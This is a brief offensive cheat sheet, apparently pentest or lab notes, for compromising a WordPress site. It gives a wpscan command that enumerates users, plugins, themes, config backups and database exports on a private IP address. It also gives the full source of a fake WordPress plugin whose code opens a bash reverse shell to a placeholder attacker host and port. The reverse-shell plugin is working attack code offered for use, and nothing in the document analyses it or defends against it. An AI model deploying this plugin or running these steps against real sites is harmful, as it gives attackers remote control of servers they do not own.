### Scan for vulnerabilities and User

```bash
wpscan --url http://192.168.0.79 --enumerate u,ap,at,cb,dbe --plugins-detection aggressive
```

### Reverse Shell Plugin

```bash
<?php

/**
* Plugin Name: Wordpress  Reverse Shell
* Author: NAME
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/x.x.x.x/xxxx 0>&1'")
?>
```



